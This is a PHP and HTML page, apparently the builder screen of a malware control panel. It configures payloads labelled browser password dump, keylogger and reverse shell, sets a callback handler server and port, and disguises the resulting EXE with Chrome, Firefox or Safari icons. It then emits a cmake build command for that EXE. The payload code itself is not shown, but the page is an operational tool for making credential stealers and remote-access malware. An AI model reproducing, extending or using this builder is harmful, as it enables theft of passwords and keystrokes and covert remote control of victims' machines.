<?php
session_start();
if(!isset($_SESSION['IAm-logined'])){
	header('location: login.php');
	exit;
}


include "../assets/php/header.php";

$handler_path = str_replace("builder","handler/server.php",$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link href="../assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="../assets/css/style.css" rel="stylesheet">
    <script src="../assets/js/jquery.min.js"></script>
    <script src="./assets/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>


    <title>Builder</title>

</head>
<style>
    .custom-control-label {
        display: flex;
        align-items: center;
    }
    .icon {
        width: 32px;
        height: 32px;
        margin-right: 10px;
    }



    .swal-wide{
    width:850px !important;
    }
</style>


<body class="bg-light">

    <!-- header -->
        <?php  echo $header; ?>

    <!-- header end -->

    <div class="mt-2 d-flex justify-content-center">
        <select class="form-select w-50 m-1" >
            <option selected>Select Payload Type</option>
            <option value="1">Browser Password Dump</option>
            <option value="2">Keylogger</option>
            <option value="3">Reverse Shell</option>
        </select>
    </div>


    <div class="mt-2 d-flex justify-content-center">
        <div class="input-group w-50 m-1">
            <input type="text" id="payload-name-field" class="form-control" placeholder="Payload Name" value= >
            <div class="input-group-append m-1">
                <button class="btn btn-outline-secondary" type="button" onclick='$("#payload-name-field").val((Math.random() + 1).toString(36).substring(7))'>random</button>
            </div>
        </div>

    </div>

    <div class="mt-2 d-flex justify-content-center">
        <div class="input-group w-50 m-1">
            <input type="text" id="server-name-field" class="form-control" placeholder="Server Address" value= >
            <div class="input-group-append m-1">
                <button class="btn btn-outline-secondary" type="button" onclick='$("#server-name-field").val("<?php echo $handler_path ?>")'>Default</button>
            </div>
        </div>
    </div>

    <div class="mt-2 d-flex justify-content-center">
        <div class="input-group mb-3 w-50 m-1">
        <input type="text" id="server-port-field" class="form-control" placeholder="Server Port">
        <button class="btn btn-outline-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown">Select</button>
        <ul class="dropdown-menu dropdown-menu-end">
            <li><a id="https" href="javascript:" class="dropdown-item" onclick='$("#server-port-field").val(443)'>Set 443(https)</a></li>
            <li><a id="http" href="javascript:" class="dropdown-item" onclick='$("#server-port-field").val(80)'>Set 80(http)</a></li>
        </ul>
        </div>
    </div>



    <div class="mt-2 d-flex justify-content-center ">
        <div class="container w-50 m-1">
            <h3>Select Icon</h3>
            <form id="iconForm">
                <div class="form-group row">
                    <div class="col-sm-3">
                        <div class="custom-control custom-radio">
                            <input type="radio" id="chrome" name="icon" value="chrome" class="custom-control-input" checked>
                            <label class="custom-control-label" for="chrome">
                                <img src="./assets/icon/Firefox-logo.png" alt="Chrome Icon" class="icon">
                                Chrome
                            </label>
                        </div>
                    </div>
                    <div class="col-sm-3">
                        <div class="custom-control custom-radio">
                            <input type="radio" id="firefox" name="icon" value="firefox" class="custom-control-input">
                            <label class="custom-control-label" for="firefox">
                                <img src="./assets/icon/Firefox-logo.png" alt="Firefox Icon" class="icon">
                                Firefox
                            </label>
                        </div>
                    </div>
                    <div class="col-sm-3">
                        <div class="custom-control custom-radio">
                            <input type="radio" id="safari" name="icon" value="safari" class="custom-control-input">
                            <label class="custom-control-label" for="safari">
                                <img src="./assets/icon/Firefox-logo.png" alt="Safari Icon" class="icon">
                                Safari
                            </label>
                        </div>
                    </div>


                    <div class="col-sm-3">
                        <div class="custom-control custom-radio">
                            <input type="radio" id="safari" name="icon" value="safari" class="custom-control-input">
                            <label class="custom-control-label" for="safari">
                                <img src="./assets/icon/Firefox-logo.png" alt="Safari Icon" class="icon">
                                Safari
                            </label>
                        </div>
                    </div>
   
                </div>
                <br>
            </form>
        </div>
    </div>




    <div class="mt-2 d-flex justify-content-center">
    <button id="generate-exe" class="btn btn-success w-50">Build EXE</button>
    </div>
   
</body>


<script>
// پیدا کردن المان select
var selectElement = document.querySelector('.form-select');

// تعریف تابع برای رویداد onchange
function logSelectedValue() {
  // گرفتن مقدار انتخاب شده توسط کاربر
  var selectedValue = selectElement.value;

  // چاپ مقدار انتخاب شده
  console.log(selectedValue);
}

// الصاق رویداد onchange به المان select
selectElement.onchange = logSelectedValue;


</script>


<script>
    $("#generate-exe").click(function(){
        var payload_name = $("#payload-name-field").val()
        var server_name = $("#server-name-field").val().split("/")
        var port_server = $("#server-port-field").val()

        if(payload_name == "" && port_server == ""){
            console.log("🗿")
        }else{
            var path = server_name.slice(-2)

            command = `cmake -Bbuild -DEXENAME="${payload_name}" -DHOSTNAME="${server_name[0]}" -DPORT=${port_server} -DPATH=${path[0]}/${path[1]}`
            Swal.fire({
                title: 'اینو کپی کن تو ترمینالت خوشگله',
                input: 'text',
                icon: 'warning',
                inputValue: command,
                customClass: 'swal-wide',
                showCancelButton: true,
                confirmButtonText: 'Copy',
                cancelButtonText: `Don't copy`,

                }).then((result) => {
                
                    if (result.isConfirmed) {
                        navigator.clipboard.writeText(command);
                        Swal.fire('Saved!', '', 'success')
                    } else if (result.isConfirmed == false) {
                        Swal.fire('OK', '', 'info')
                    }
                })
            }
        
    })


</script>
</html>

